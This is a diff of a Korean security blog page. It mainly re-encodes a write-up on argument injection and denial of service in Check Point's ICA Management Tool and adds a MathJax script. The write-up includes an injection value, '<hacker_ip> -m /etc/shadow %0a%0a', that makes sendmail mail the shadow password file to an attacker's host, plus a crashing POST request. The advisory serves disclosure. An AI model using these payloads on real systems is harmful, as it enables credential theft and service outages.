@@ -61,7 +61,7 @@
   <script src="/js/utils.js"></script>
   <script src="/js/color-schema.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
 </head>
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      207 자
+      422 자
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      4
+      8
        분
     </span>
   
@@ -244,10 +244,10 @@
 <h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul>
 <li>Checkpoint Security Manager - ICA Management Tool</li>
 </ul>
-<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Checkpoint Security Management의 ICA(Internal Certificate Authority) Management Tool에서 Argument Injection과 Denial of Service 취약점이 발견되었습니다. ICA Management Tool은 기본적으로 비활성화되어있으며 <code>cpca_client set_mgmt_tool on &lt;your certification&gt;</code>로 활성화할 수 있으며 설정이 활성화되면 http://<smartcenter_ip>:18265/를 통해 접근할 수 있습니다. <code>cpca_client set_mgmt_tool on -no_ssl</code>을 통해 활성화할 시 인증 없이 해당 서비스에 접근이 가능하며 Manage Certificates에 접속했을 때 관리자인지 별도의 확인을 진행하지 않습니다.</smartcenter_ip></p>
-<p>ICA Management Tool에서 메일을 보내는 프로세스인 cpca는 sendmail 바이너리를 통하여 메일을 전송합니다. sendmail은 파일 전송 기능을 지원하지만 메일을 보낼 때 누가 보내는지 확인을 하지 않으며 최고 권한으로 실행되므로 모든 파일에 접근이 가능합니다. 따라서 인자로 파일 이름을 넘겨주면 해커의 메일 서버로 파일을 전송할 수 있습니다. </p>
-<p>해커가 netcat 등을 통해 서버를 연 후 Configure the CA의 “Management Tool mail server”에 <code>&lt;hacker_ip&gt; -m /etc/shadow %0a%0a</code>를 입력하면 해커의 메일 서버에 <code>/etc/shadow</code> 파일 내용이 메일 형식으로 날아오게 됩니다.</p>
-<p>Denial of Service의 경우 입력 값에 대한 유효성 검사 실패로 인해 발생합니다. 원격 클라이언트가 다음과 같은 형식으로 POST request를 보낼 경우 프로그램이 종료됩니다.</p>
+<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Checkpoint Security Management&#xC758; ICA(Internal Certificate Authority) Management Tool&#xC5D0;&#xC11C; Argument Injection&#xACFC; Denial of Service &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. ICA Management Tool&#xC740; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4;&#xC788;&#xC73C;&#xBA70; <code>cpca_client set_mgmt_tool on &lt;your certification&gt;</code>&#xB85C; &#xD65C;&#xC131;&#xD654;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xC124;&#xC815;&#xC774; &#xD65C;&#xC131;&#xD654;&#xB418;&#xBA74; http://<smartcenter_ip>:18265/&#xB97C; &#xD1B5;&#xD574; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>cpca_client set_mgmt_tool on -no_ssl</code>&#xC744; &#xD1B5;&#xD574; &#xD65C;&#xC131;&#xD654;&#xD560; &#xC2DC; &#xC778;&#xC99D; &#xC5C6;&#xC774; &#xD574;&#xB2F9; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xC811;&#xADFC;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xBA70; Manage Certificates&#xC5D0; &#xC811;&#xC18D;&#xD588;&#xC744; &#xB54C; &#xAD00;&#xB9AC;&#xC790;&#xC778;&#xC9C0; &#xBCC4;&#xB3C4;&#xC758; &#xD655;&#xC778;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</smartcenter_ip></p>
+<p>ICA Management Tool&#xC5D0;&#xC11C; &#xBA54;&#xC77C;&#xC744; &#xBCF4;&#xB0B4;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC778; cpca&#xB294; sendmail &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xD1B5;&#xD558;&#xC5EC; &#xBA54;&#xC77C;&#xC744; &#xC804;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;. sendmail&#xC740; &#xD30C;&#xC77C; &#xC804;&#xC1A1; &#xAE30;&#xB2A5;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xC9C0;&#xB9CC; &#xBA54;&#xC77C;&#xC744; &#xBCF4;&#xB0BC; &#xB54C; &#xB204;&#xAC00; &#xBCF4;&#xB0B4;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xC744; &#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA70; &#xCD5C;&#xACE0; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xBBC0;&#xB85C; &#xBAA8;&#xB4E0; &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC778;&#xC790;&#xB85C; &#xD30C;&#xC77C; &#xC774;&#xB984;&#xC744; &#xB118;&#xACA8;&#xC8FC;&#xBA74; &#xD574;&#xCEE4;&#xC758; &#xBA54;&#xC77C; &#xC11C;&#xBC84;&#xB85C; &#xD30C;&#xC77C;&#xC744; &#xC804;&#xC1A1;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p>
+<p>&#xD574;&#xCEE4;&#xAC00; netcat &#xB4F1;&#xC744; &#xD1B5;&#xD574; &#xC11C;&#xBC84;&#xB97C; &#xC5F0; &#xD6C4; Configure the CA&#xC758; &#x201C;Management Tool mail server&#x201D;&#xC5D0; <code>&lt;hacker_ip&gt; -m /etc/shadow %0a%0a</code>&#xB97C; &#xC785;&#xB825;&#xD558;&#xBA74; &#xD574;&#xCEE4;&#xC758; &#xBA54;&#xC77C; &#xC11C;&#xBC84;&#xC5D0; <code>/etc/shadow</code> &#xD30C;&#xC77C; &#xB0B4;&#xC6A9;&#xC774; &#xBA54;&#xC77C; &#xD615;&#xC2DD;&#xC73C;&#xB85C; &#xB0A0;&#xC544;&#xC624;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p>
+<p>Denial of Service&#xC758; &#xACBD;&#xC6B0; &#xC785;&#xB825; &#xAC12;&#xC5D0; &#xB300;&#xD55C; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC; &#xC2E4;&#xD328;&#xB85C; &#xC778;&#xD574; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC6D0;&#xACA9; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xD615;&#xC2DD;&#xC73C;&#xB85C; POST request&#xB97C; &#xBCF4;&#xB0BC; &#xACBD;&#xC6B0; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC885;&#xB8CC;&#xB429;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs pgsql">POST /file_init?_ HTTP/<span class="hljs-number">1.1</span>
 Host: <span class="hljs-keyword">checkpoint</span>.host:<span class="hljs-number">18265</span>
 Cookie: _
@@ -553,6 +553,45 @@ q</code></pre>
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
 
 
 
